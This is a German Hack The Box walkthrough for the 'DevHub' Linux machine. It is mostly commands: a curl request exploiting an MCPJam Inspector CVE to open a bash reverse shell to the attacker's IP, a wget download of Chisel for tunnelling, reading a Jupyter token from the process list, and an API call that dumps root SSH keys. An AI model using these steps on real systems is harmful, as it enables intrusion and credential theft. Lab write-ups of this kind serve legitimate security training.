# DevHub – HTB Walkthrough (Medium Linux)

**Maschine:** DevHub  
**Schwierigkeit:** Medium  
**OS:** Linux  
**Themen:** CVE-2026-23744, Chisel Tunneling, Jupyter, Flask API, Root Privilege Escalation  

---

## 📌 1. Aufklärung

```bash
nmap -sC -sV devhub.htb

Ergebnis:

    Port 22 (SSH)

    Port 80 (HTTP)

    Port 6274 (MCPJam Inspector)

📌 2. Hosts-Datei anpassen

echo "10.x.x.x devhub.htb" >> /etc/hosts

📌 3. Webseite erkunden

    http://devhub.htb/ → Landingpage

    http://devhub.htb:6274/ → MCPJam Inspector v1.4.2 (anfällig für CVE-2026-23744)

📌 4. Reverse Shell als mcp-dev

Terminal 1 – Listener:

nc -lvnp 4444

Terminal 2 – Payload:

curl -X POST http://devhub.htb:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.x.x.x/4444 0>&1"],"env":{}},"serverId":"mytest"}'

✅ Shell als mcp-dev
📌 5. Chisel Tunnel einrichten

HTTP-Server (Angreifer):

python3 -m http.server 8000 --bind 10.x.x.x

Chisel auf Ziel herunterladen (mcp-dev-Shell):

cd /tmp
wget http://10.x.x.x:8000/chisel
chmod +x chisel

Chisel-Server (Angreifer):

./chisel server --reverse --port 9001

Chisel-Client (mcp-dev-Shell):

./chisel client 10.x.x.x:9001 R:8888:127.0.0.1:8888 &

📌 6. Jupyter Zugriff

Token auslesen (mcp-dev-Shell):

ps aux | grep jupyter | grep -v grep

Token: a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2xxxxxxxxxx

Browser: http://localhost:8888/?token=...
📌 7. Root-SSH-Key abrufen (in Jupyter)

import requests, json

url = "http://127.0.0.1:5000/tools/call"
headers = {"X-API-Key": "opsmcp_secret_key_4f5a6b7xxxxxxxxx", "Content-Type": "application/json"}
payload = {"name": "ops._admin_dump", "args": {"target": "ssh_keys", "confirm": True}}

response = requests.post(url, headers=headers, json=payload)
print(json.dumps(response.json(), indent=2))

📌 8. Root einloggen

nano root_key
# Key einfügen
chmod 600 root_key
ssh -i root_key root@devhub.htb

📌 9. Flags

cat /root/root.txt 
cat /home/analyst/user.txt

Root-Flag:

08be4cfb68597d0f9edfccxxxxxxxxxx



Viel Erfolg! 🚀



---
